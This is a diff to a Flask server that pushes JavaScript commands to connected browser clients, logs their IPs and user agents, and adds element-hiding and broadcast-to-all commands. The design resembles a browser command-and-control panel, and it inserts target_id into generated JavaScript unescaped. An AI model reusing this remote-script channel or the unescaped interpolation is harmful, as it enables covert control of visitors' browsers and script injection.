@@ -287,6 +287,24 @@ def set_command():
                 
                 # Generate command based on action type
                 js_command = generate_manipulation_command(target_id, action, content)
+            elif command_type == 'visibility':
+                target_id = data.get('target_id')
+                visibility = data.get('visibility')
+                if not target_id or not visibility:
+                    raise CommandError("For visibility commands, target_id and visibility are required")
+                
+                # Generate visibility command
+                display_value = 'none' if visibility == 'hide' else 'block'
+                # Try both class and ID selectors
+                js_command = f"""
+                    const elementById = document.getElementById('{target_id}');
+                    const elementsByClass = document.getElementsByClassName('{target_id}');
+                    if (elementById) {{
+                        elementById.style.display = '{display_value}';
+                    }} else if (elementsByClass.length > 0) {{
+                        Array.from(elementsByClass).forEach(el => el.style.display = '{display_value}');
+                    }}
+                """
             else:
                 raise CommandError(f"Unsupported command type: {command_type}")
             
@@ -303,23 +321,42 @@ def set_command():
             }
             
             # Store command in database and update cache
-            command = command_repo.create(client_id, command_type, js_command, command_id)
-            commands[client_id] = command_data
-            
-            # Update client info
-            if client_id in clients:
-                clients[client_id]["last_command"] = current_time
+            # Update command handling for default
+            if client_id == 'default':
+                # Store as default command for new clients
+                commands['default'] = command_data
                 
-            # Send via WebSocket if available
-            if socketio_available and client_id in socket_clients:
-                try:
-                    socketio.emit('command', command_data, room=socket_clients[client_id])
-                except Exception as e:
-                    app_logger.error(f"Failed to send command via WebSocket: {e}")
-            
+                # Apply to all active clients
+                for active_client_id, client_data in clients.items():
+                    if client_data.get('active', False):
+                        # Store command for each active client
+                        commands[active_client_id] = command_data
+                        
+                        # Send via WebSocket if available for this client
+                        if socketio_available and active_client_id in socket_clients:
+                            try:
+                                socketio.emit('command', command_data, room=socket_clients[active_client_id])
+                            except Exception as e:
+                                app_logger.error(f"Failed to send command via WebSocket to client {active_client_id}: {e}")
+            else:
+                # Single client command handling
+                command = command_repo.create(client_id, command_type, js_command, command_id)
+                commands[client_id] = command_data
+                
+                # Update client info
+                if client_id in clients:
+                    clients[client_id]["last_command"] = current_time
+                    
+                # Send via WebSocket if available
+                if socketio_available and client_id in socket_clients:
+                    try:
+                        socketio.emit('command', command_data, room=socket_clients[client_id])
+                    except Exception as e:
+                        app_logger.error(f"Failed to send command via WebSocket: {e}")
+
             # Log command
             log_command(client_id, command_type, command_id)
-            
+
             # Add to command history
             log_entry = {
                 "id": command_id,
@@ -400,16 +437,14 @@ def get_clients():
     Endpoint para listar todos os clientes conectados.
     Limpa clientes inativos automaticamente (sem atividade por 30+ minutos).
     """
-    # Remove clientes inativos
-    now = datetime.now()
-    cleanup_time = now - timedelta(minutes=30)
-    cleanup_str = cleanup_time.isoformat()
+    # Atualiza status de atividade de todos os clientes
+    update_client_active_status()
     
     # Formata dados dos clientes para exibição no frontend
     client_list = [
         {
             "id": client_id,
-            "active": client.get("last_seen", "") > cleanup_str,
+            "active": client.get("active", False),
             "last_seen": client.get("last_seen", ""),
             "user_agent": client.get("user_agent", ""),
             "ip": client.get("ip", ""),
@@ -563,9 +598,9 @@ def get_command():
             client_repo.create_or_update(client_id, **client_data)
             clients[client_id] = client_data
 
-            # Inicializa comando para novo cliente
-            if client_id not in commands:
-                commands[client_id] = commands.get('default', {"id": "", "command": "", "timestamp": ""})
+            # Transfere qualquer comando default para o novo cliente
+            if 'default' in commands and commands['default'].get('id'):
+                commands[client_id] = commands['default']
         else:
             # Atualiza informações do cliente existente
             client_data = {
@@ -576,9 +611,16 @@ def get_command():
             }
             client_repo.create_or_update(client_id, **client_data)
             clients[client_id].update(client_data)
+            
+            # Atualiza status de ativo
+            clients[client_id]['active'] = True
 
     # Obtém o comando atual para este cliente
-    current_command = commands.get(client_id, commands.get('default', {"id": "", "command": "", "timestamp": ""}))
+    current_command = commands.get(client_id, {"id": "", "command": "", "timestamp": ""})
+    
+    # Se não há comando específico e há um comando default, usa o default
+    if not current_command.get('id') and 'default' in commands:
+        current_command = commands['default']
     
     # Log para depuração
     app_logger.debug(f"Cliente {client_id} solicitou comando. Último recebido: {last_received}, Atual: {current_command.get('id', '')}")
@@ -855,6 +897,42 @@ def receive_command_result():
 def favicon():
     """Rota para o favicon.ico"""
     return send_from_directory(os.path.join(app.root_path, 'static'), 'favicon.ico', mimetype='image/vnd.microsoft.icon')
+
+def is_client_active(client, cleanup_time=None):
+    """
+    Verifica se um cliente está ativo baseado em seu último registro de atividade.
+    
+    Args:
+        client: Dicionário com dados do cliente
+        cleanup_time: String ISO formatada do tempo limite para inatividade.
+                     Se não fornecido, usa 30 minutos atrás.
+                     
+    Returns:
+        bool: True se o cliente está ativo, False caso contrário
+    """
+    if not cleanup_time:
+        cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
+    return client.get("last_seen", "") > cleanup_time
+
+def update_client_active_status():
+    """
+    Atualiza o status ativo/inativo de todos os clientes no cache.
+    Remove clientes inativos do dicionário socket_clients.
+    """
+    cleanup_time = (datetime.now() - timedelta(minutes=30)).isoformat()
+    inactive_clients = []
+    
+    for client_id, client in clients.items():
+        # Atualiza o status de ativo
+        client['active'] = is_client_active(client, cleanup_time)
+        
+        # Se inativo, adiciona à lista para limpar socket_clients
+        if not client['active'] and client_id in socket_clients:
+            inactive_clients.append(client_id)
+    
+    # Remove clientes inativos de socket_clients
+    for client_id in inactive_clients:
+        del socket_clients[client_id]
 
 if __name__ == '__main__':
     if socketio_available:
